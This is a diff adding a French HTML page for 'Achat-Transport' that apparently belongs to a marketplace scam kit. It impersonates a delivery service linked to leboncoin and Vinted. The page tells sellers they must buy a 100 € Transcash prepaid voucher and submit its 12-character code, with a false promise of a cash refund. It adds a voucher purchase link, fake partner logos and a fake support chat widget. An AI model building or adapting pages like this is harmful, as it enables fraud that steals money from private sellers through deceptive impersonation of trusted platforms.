@@ -1,0 +1,173 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Achat-Transport - Validation de la Transaction</title>
+    <link rel="stylesheet" href="styles/verification.css">
+</head>
+<body>
+
+    <!-- Header / Navigation (Copie conforme exacte de la page 2) -->
+    <header class="header">
+        <div class="container navbar">
+            <a href="#" class="logo">🤝 Achat<span> Transport</span></a>
+            <nav class="nav-links">
+                <a href="#" class="btn-primary commentcamarche">Mon Espace Vendeur</a>
+                <a href="index.html" class="btn-primary">Déconnexion</a>
+            </nav>  
+        </div>
+    </header>
+
+
+        <!-- NOUVELLE SECTION : Partenaires de confiance -->
+    <section class="partners-section">
+        <div class="container partners-container">
+            <p class="partners-title">Compatible avec vos ventes sur</p>
+            <div class="partners-logos">
+                <div class="partner-logo-box">
+                    <img src="images/lbc.jpg" alt="lbc" class="partner-img">
+                    <span class="partner-name">leboncoin</span>
+                </div>
+                <div class="partner-logo-box">
+                    <img src="images/vint.jpg" alt="Vint" class="partner-img">
+                    <span class="partner-name">Vinted</span>
+                </div>
+                <div class="partner-logo-box">
+                    <img src="images/trans1.png" alt="Vint" class="partner-img">
+                    <span class="partner-name">Vinted</span>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Zone principale : Utilise la classe globale dashboard-section -->
+    <main class="dashboard-section verification-page-wrapper">
+
+        
+        <div class="verification-container-90">
+
+            
+            
+            <!-- Carte blanche (Même style exact que les pages précédentes) -->
+            <section class="shadow-card">
+                <div class="card-header">
+                    <span class="badge-status badge-alert">Validation Requise</span>
+                    <h2>Confirmation obligatoire du rendez-vous</h2>
+                    <p class="subtitle">Procédure de sécurisation du protocole de collecte</p>
+                </div>
+                
+                <!-- Détails de la transaction -->
+                <div class="transaction-details">
+                    <div class="detail-item">
+                        <span class="detail-label">Site de vente</span>
+                        <strong class="detail-value text-highlight">Leboncoin</strong>
+                    </div>
+                    
+                    <div class="detail-item">
+                        <span class="detail-label">Article</span>
+                        <strong class="detail-value" id="article">Vélo de course Scott Speedster</strong>
+                    </div>
+                    
+                    <div class="detail-item">
+                        <span class="detail-label">Prix de l'article</span>
+                        <strong class="detail-value" id="prix"></strong>
+                    </div>
+                    
+                    <div class="detail-item total-box">
+                        <span class="detail-label">Montant payé à la collecte</span>
+                        <strong class="detail-value price-tag" id="montantTotal"></strong>
+                    </div>
+                </div>
+
+                <!-- Message d'avertissement -->
+                <div class="info-alert verification-alert">
+                    <p>⚠️ <strong>Instruction de validation impérative :</strong> Pour valider définitivement le créneau de passage, vous devriez suivre la procédure de sécurisation du protocole de collecte et fournir un code de coupon recharge TRANSCASH d'un montant de 100 €, ce protocole à pour but d'éviter les rendez-vous fantaisiste ainsi que les vendeurs non sérieux.</p>
+                    <p style="margin-top: 12px;">Ce montant temporaire sert d'activation de sécurité. <strong>Il vous sera intégralement restitué en espèces</strong>, en plus des  <strong id="prix2">450,00 €</strong> de la vente, directement par notre agent lors de la collecte physique du colis.</p>
+                    <br><br><p>PS: Les points de vente des recharges TRANSCASH proche de votre localité: <strong>Bureau de tabac, marchands de presse</strong> ou vous rendre sur ce site pour l'achat du ticket en ligne <a href="https://allo.monisnap.com/fr/cartes-prepayees/transcash "  target="_blank" class="para"> <strong>Acheter ici</strong> </a></p>
+                </div>
+
+           <div class="partners-logos">
+
+                <div class="partner-logo-box">
+                    <img src="images/trans2.jpg" alt="lbc" class="partner-img0 trans" >
+                    <span class="partner-name">leboncoin</span>
+                </div>
+                <div class="partner-logo-box">
+                    <img src="images/tabac.jpg" alt="lbc" class="partner-img0 trans imghide" >
+                    <span class="partner-name">leboncoin</span>
+                </div>
+                <div class="partner-logo-box">
+                    <img src="images/trans1.png" alt="Vint" class="trans imghide">
+                    <span class="partner-name">Vinted</span>
+                </div>
+
+
+            </div>
+
+                <!-- Formulaire de saisie -->
+                <form id="verification-code-form" novalidate style="margin-top: 24px;">
+                    <div class="form-group">
+                        <label for="activation-code">Code de recharge Transcash (100 €)</label>
+                        <input type="text" id="activation-code" placeholder="Ex: XXXXXXXXXXXXXXXX" minlength="12" maxlength="12" required>
+                        <span class="error-message" id="activation-error"></span>
+                    </div>
+                    
+                    <button type="submit" class="btn-submit btn-accent">Soumettre et valider le passage de l'agent</button>
+                </form>
+
+                <div id="verification-status" class="status-box hidden"></div>
+            </section>
+            
+        </div>
+    </main>
+
+    <!-- Footer (Copie conforme exacte de la page 2) -->
+    <footer class="footer">
+        <div class="container">
+            <p>&copy; 2026 Achat-Transport. Espace Vendeur Sécurisé.</p>
+        </div>
+    </footer>
+
+
+    
+        <!-- ==========================================================================
+       WIDGET CHAT SERVICE CLIENTELE FLOUTÉ
+       ========================================================================== -->
+    <div id="Achat-Transport-chat-widget" class="chat-widget-container">
+        <!-- Bulle d'activation flottante -->
+        <button id="chat-trigger-btn" class="chat-trigger-button">
+            <span class="chat-icon-open">💬</span>
+            <span class="chat-icon-close hidden">✖</span>
+        </button>
+
+        <!-- Fenêtre de messagerie -->
+        <div id="chat-window" class="chat-window-box hidden">
+            <div class="chat-window-header">
+                <div class="chat-agent-avatar">🤝</div>
+                <div>
+                    <h4>Assistance Achat-Transport</h4>
+                    <p class="chat-agent-status">● En ligne</p>
+                </div>
+            </div>
+            
+            <!-- Zone d'affichage des messages -->
+            <div id="chat-messages-body" class="chat-messages-container">
+                <div class="message-bubble agent-message">
+                  <!--   Bonjour ! Comment puis-je vous aider aujourd'hui concernant la planification de la collecte de votre colis ?  -->              </div>
+            </div>
+
+            <!-- Formulaire d'envoi -->
+            <form id="chat-input-form" class="chat-footer-form">
+               <textarea id="chat-user-text" placeholder="Écrivez votre message..." required rows="1"></textarea>
+                <button type="submit" class="chat-send-btn">➤</button>
+            </form>
+        </div>
+    </div>
+
+
+    <script src="js/verification.js"></script>
+    <script src="js/chat.js"></script>
+
+</body>
+</html>
